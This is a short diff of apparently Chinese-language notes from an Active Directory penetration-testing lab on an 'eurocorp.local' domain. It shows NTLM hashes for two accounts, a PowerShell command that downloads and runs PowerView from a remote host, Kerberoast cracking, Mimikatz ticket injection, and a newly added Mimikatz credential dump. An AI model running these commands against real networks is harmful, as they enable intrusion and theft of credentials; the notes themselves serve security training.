@@ -2875,7 +2875,7 @@ Administrator:cdcfd73ba273d2b6ab67f1fecd83e88e
 dbadmin: 0553b02b95f64f7a3c27b9029d105c27
 ```
 
-但是开一个新的shell进去，发现这个其实是本地的Administrator，感觉blooodhound有时候也不太准啊。。
+但是开一个新的shell进去，发现这个其实是本地的Administrator，感觉blooodhound有时候也不太准啊。。可能是因为当前账号是nt authority\system，并非域账号.
 
 
 iex (iwr http://172.16.100.66/PowerView.ps1 -UseBasicParsing)
@@ -2916,7 +2916,10 @@ python.exe C:\ad\kerberoast\tgsrepcrack.py C:\ad\kerberoast\10k-worst-pass.txt
 Invoke-Mimikatz -Command '"kerberos::ptt C:\Users\dbadmin\Documents\[0;3e7]-2-0-60a10000-EU-SQL$@krbtgt-EU.EUROCORP.LOCAL.kirbi"'
 
 
-Invoke-Command -ScriptBlock{whoami;hostname} -computername eu-dc.eu.eurocorp.local
+Invoke-Command -ScriptBlock{whoami;hostname} -computername eu-sql.eu.eurocorp.local
+
+
+Invoke-Mimikatz -Command '"sekurlsa::logonPasswords full"'
 
 Invoke-Bloodhound -CollectionMethod All -Domain eu.eurocorp.local
 
